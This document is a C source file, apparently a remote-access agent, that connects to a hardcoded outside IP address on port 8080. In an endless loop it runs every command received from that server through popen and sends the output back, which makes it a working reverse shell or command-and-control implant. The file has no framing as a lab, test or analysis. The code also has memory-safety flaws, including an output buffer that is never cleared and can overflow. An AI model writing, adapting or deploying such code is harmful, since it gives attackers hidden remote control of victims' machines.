#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>

#define PORT 8080
#define BUFFER_SIZE 1024

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char *message = "Agent connected!";
    char buffer[BUFFER_SIZE] = {0};
    char output[4096] = "";
    char buffer2[256];
    
    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Socket creation error\n");
        return -1;
    }
    
    // Setup server address
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    
    // Convert IPv4 address from text to binary
    if (inet_pton(AF_INET, "44.202.210.234", &serv_addr.sin_addr) <= 0) {
        printf("Invalid address\n");
        return -1;
    }
    
    // Connect to server
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("Connection failed\n");
        return -1;
    }
    
    // Send message to server
    send(sock, message, strlen(message), 0);
    printf("Sent to server: %s\n", message);
    
    // Read response from server
    while (1)
    {
        read(sock, buffer, BUFFER_SIZE);
        FILE *fp = popen(buffer, "r");
        while (fgets(buffer2, sizeof(buffer2), fp) != NULL) {
            strcat(output, buffer2);
        }   
    
        pclose(fp);
        send(sock, output, strlen(output), 0);
    }
    
    // Close connection
    close(sock);
    
    return 0;
}
